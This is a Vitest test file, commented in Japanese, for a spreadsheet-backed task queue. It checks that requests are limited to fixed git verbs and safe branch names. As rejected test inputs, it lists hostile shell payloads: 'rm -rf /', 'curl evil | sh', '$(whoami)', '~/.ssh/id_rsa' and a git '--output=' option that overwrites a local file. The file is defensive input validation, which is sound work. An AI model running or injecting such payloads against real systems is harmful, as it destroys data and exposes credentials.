import { describe, it, expect } from 'vitest';
import { loadGasWith } from './harness.js';
import { createFakeGas } from './fakegas.js';

const SOURCES = [
  'src/core/Hash.js', 'src/core/HashGas.gs', 'src/core/Db.gs',
  'src/core/Repo.gs', 'src/core/Plain.js', 'src/core/Outbox.gs',
];

/*
 * この表は台帳 (スプレッドシート) にあり、Drive を共有している人なら手で
 * 書き換えられる。頼みごとを自由な文字列にすると、Drive に書ける人が全員の
 * 手元マシンで好きなコマンドを走らせられることになる。
 */
function setup() {
  const fake = createFakeGas();
  const ctx = loadGasWith(fake, ...SOURCES);
  ctx.repoInit('agentic-management');
  return { ctx, fake };
}

describe('頼めることを列挙する', () => {
  it('知らない動詞は置けない', () => {
    const { ctx } = setup();

    expect(() => ctx.outboxAdd('run', { cmd: 'rm -rf /' }))
      .toThrow('頼めない動詞です');
    expect(ctx.dbReadAll('outbox')).toEqual([]);
  });

  it('決めた動詞だけ通る', () => {
    const { ctx } = setup();

    ['diff', 'merge', 'review'].forEach((verb) => {
      expect(() => ctx.outboxAdd(verb, { branch: 'feat/x' })).not.toThrow();
    });
  });

  it('決めた欄以外は捨てる', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('merge', { branch: 'feat/x', cmd: 'curl evil' });

    // 通すと、手元で字をつなげてコマンドにされたときに別の命令を足せる
    expect(JSON.parse(row.args)).toEqual({ branch: 'feat/x' });
  });

  it('空白やシェルの記号は通さない', () => {
    const { ctx } = setup();

    [
      'feat/x; curl evil | sh',
      'feat/x && rm -rf .',
      'feat/x `id`',
      '$(whoami)',
      'feat/x\nmerge',
      'feat/x merge',
      'feat/x > /dev/null',
      "feat/x'",
      'feat/x\\',
      'feat/*',
      '~/.ssh/id_rsa',
      'feat/x#1',
    ].forEach((bad) => {
      expect(() => ctx.outboxAdd('merge', { branch: bad }), bad)
        .toThrow('引数に使えない字があります');
    });
  });

  it('ふつうのブランチ名は通る', () => {
    const { ctx } = setup();

    // **この道具のブランチ名は日本語である。** ASCII だけに絞ると正規の
    // 名前が弾かれ、承認しても手元に頼めなくなる (実際に踏んだ)
    ['feat/phase3a-sheets', 'main', 'release-1.2.0', 'fix_a.b',
      '見直し', '土台', '就業規則の改訂', 'Ａ案'].forEach((ok) => {
      expect(() => ctx.outboxAdd('merge', { branch: ok }), ok).not.toThrow();
    });
  });

  it('上に抜ける道のりは通さない', () => {
    const { ctx } = setup();

    expect(() => ctx.outboxAdd('diff', { branch: '../../etc' }))
      .toThrow('引数に使えない字があります');
  });

  it('長すぎるものは通さない', () => {
    const { ctx } = setup();

    expect(() => ctx.outboxAdd('diff', { branch: 'a'.repeat(201) }))
      .toThrow('引数に使えない字があります');
  });

  it('一言は人が読むためのもので、長さを切る', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('diff', { branch: 'x' }, { note: 'あ'.repeat(900) });

    expect(String(row.note).length).toBe(500);
  });
});

describe("'-' で始まる引数", () => {
  it('git のオプションに見えるものは置かせない', () => {
    const { ctx } = setup();

    // 手元で git diff に渡ると --output=<ファイル> で手元のファイルを書き換えられた
    expect(() => ctx.outboxAdd('diff', { branch: '見直し', against: '--output=/Users/a/.zshrc' }))
      .toThrow('引数に使えない字');
    expect(() => ctx.outboxAdd('review', { branch: '-x' })).toThrow('引数に使えない字');
    expect(ctx.outboxAdd('diff', { branch: '見直し', against: 'main' }).verb).toBe('diff');
  });
});

describe('取りに来る形', () => {
  it('取ると印が付く', () => {
    const { ctx } = setup();
    ctx.outboxAdd('diff', { branch: 'x' });

    const taken = ctx.outboxTake(5);
    expect(taken).toHaveLength(1);
    expect(taken[0].state).toBe('taken');
    expect(taken[0].takenBy).toBe('tester@example.com');
  });

  it('二度取れない', () => {
    const { ctx } = setup();
    ctx.outboxAdd('diff', { branch: 'x' });
    ctx.outboxTake(5);

    // 印を付けないと、2つの手元が同じ頼みごとを別々に進めて
    // 同じ差分が2回添えられる
    expect(ctx.outboxTake(5)).toEqual([]);
  });

  it('一度に取る数に上限がある', () => {
    const { ctx } = setup();
    for (let i = 0; i < 30; i++) ctx.outboxAdd('diff', { branch: 'b' + i });

    expect(ctx.outboxTake(100)).toHaveLength(20);
  });

  it('終わったと返せる', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('merge', { branch: 'x' });
    ctx.outboxTake(5);

    const done = ctx.outboxDone(row.id, '取り込みました');
    expect(done.state).toBe('done');
    expect(done.result).toBe('取り込みました');
  });

  it('できなかったと返せる', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('merge', { branch: 'x' });

    // 黙って消すと、頼んだ人は待ち続けることになる
    const failed = ctx.outboxFail(row.id, '食い違いがあります');
    expect(failed.state).toBe('failed');
    expect(failed.result).toBe('食い違いがあります');
  });

  it('終わったものを二度終われない', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('merge', { branch: 'x' });
    ctx.outboxDone(row.id, 'ok');

    expect(() => ctx.outboxDone(row.id, 'ok again'))
      .toThrow('既に終わっています');
  });

  it('無い番号は終われない', () => {
    const { ctx } = setup();

    expect(() => ctx.outboxDone(999, 'ok')).toThrow('見つかりません');
  });

  it('番号は通し番号である', () => {
    const { ctx } = setup();
    const a = ctx.outboxAdd('diff', { branch: 'a' });
    const b = ctx.outboxAdd('diff', { branch: 'b' });

    // かぶると dbUpdate が関係のない頼みごとを書き換える
    expect(b.id).not.toBe(a.id);
  });
});

describe('取ったまま放置されたものを戻す', () => {
  it('しばらく動かなければ戻す', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('merge', { branch: 'x' });
    ctx.outboxTake(5);

    // 手元が落ちたり、取ったあと人が忘れたりする。戻さないと誰も
    // 取れないまま残り続ける
    const later = new Date(Date.now() + 25 * 3600 * 1000);
    expect(ctx.outboxReclaim(24, later)).toBe(1);
    expect(ctx.dbFindOne('outbox', 'id', row.id).state).toBe('open');
  });

  it('まだ時間が経っていなければ戻さない', () => {
    const { ctx } = setup();
    ctx.outboxAdd('merge', { branch: 'x' });
    ctx.outboxTake(5);

    const soon = new Date(Date.now() + 3600 * 1000);
    expect(ctx.outboxReclaim(24, soon)).toBe(0);
  });

  it('終わったものは戻さない', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('merge', { branch: 'x' });
    ctx.outboxTake(5);
    ctx.outboxDone(row.id, 'ok');

    const later = new Date(Date.now() + 99 * 3600 * 1000);
    expect(ctx.outboxReclaim(24, later)).toBe(0);
  });
});

describe('状態を見てから書き換えるものは鍵の中', () => {
  /*
   * 戻す・終える、はどちらも「いまの状態を見てから書く」。鍵の外で読むと、
   * 読んだあとに終わったものを open に戻し、終わった頼みごとがもう一度
   * 手元に配られる。
   */
  function watch(ctx, fake) {
    let held = false;
    const seen = [];
    fake.LockService.getScriptLock = () => ({
      tryLock: () => { held = true; return true; },
      releaseLock: () => { held = false; },
    });
    const realRead = ctx.dbReadAll;
    ctx.dbReadAll = (t) => { if (t === 'outbox') seen.push(held); return realRead(t); };
    return seen;
  }

  it('戻すときは読むところから鍵を持つ', () => {
    const { ctx, fake } = setup();
    ctx.outboxAdd('merge', { branch: 'x' });
    ctx.outboxTake(5);
    const seen = watch(ctx, fake);

    ctx.outboxReclaim(24, new Date(Date.now() + 25 * 3600 * 1000));

    expect(seen.length).toBeGreaterThan(0);
    expect(seen.every(Boolean)).toBe(true);
  });

  it('戻す片付けは、鍵が取れなければ次に回す', () => {
    const { ctx, fake } = setup();
    fake.LockService.getScriptLock = () => ({
      tryLock: () => false, releaseLock: () => {},
    });

    // 取りに来るついでの片付けなので、投げると取りに来たこと自体が落ちる
    expect(ctx.outboxReclaim(24, new Date())).toBe(0);
  });

  it('終えるときも読むところから鍵を持つ', () => {
    const { ctx, fake } = setup();
    const row = ctx.outboxAdd('merge', { branch: 'x' });
    ctx.outboxTake(5);
    const seen = watch(ctx, fake);

    ctx.outboxDone(row.id, 'ok');

    expect(seen.length).toBeGreaterThan(0);
    expect(seen.every(Boolean)).toBe(true);
  });
});

describe('画面に渡せる形', () => {
  it('Date を1つも残さない', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('diff', { branch: 'x' }, { note: 'お願い' });
    ctx.outboxTake(5);
    ctx.outboxDone(row.id, 'ok');

    const listed = ctx.outboxList('')[0];
    Object.keys(listed).forEach((key) => {
      expect(listed[key] instanceof Date, key).toBe(false);
    });
    expect(listed.createdAt).toMatch(/^\d{4}-/);
  });

  it('引数が読めない行でも落ちない', () => {
    const { ctx } = setup();
    const row = ctx.outboxAdd('diff', { branch: 'x' });

    // 手で書き換えられる表なので、読めない字が入りうる
    ctx.dbUpdate('outbox', 'id', row.id, { args: '{壊れた' });
    expect(ctx.outboxList('')[0].args).toEqual({});
  });

  it('動詞の見せる字はサーバが持つ', () => {
    const { ctx } = setup();
    ctx.outboxAdd('merge', { branch: 'x' });

    // 写すと、足したときに画面とサーバでずれる
    expect(ctx.outboxList('')[0].label).toBe('承認されたので取り込む');
  });

  it('状態で絞れる', () => {
    const { ctx } = setup();
    ctx.outboxAdd('diff', { branch: 'a' });
    const b = ctx.outboxAdd('diff', { branch: 'b' });
    ctx.outboxFail(b.id, 'だめ');

    expect(ctx.outboxList('open').map((w) => w.args.branch)).toEqual(['a']);
    expect(ctx.outboxList('failed').map((w) => w.args.branch)).toEqual(['b']);
  });
});
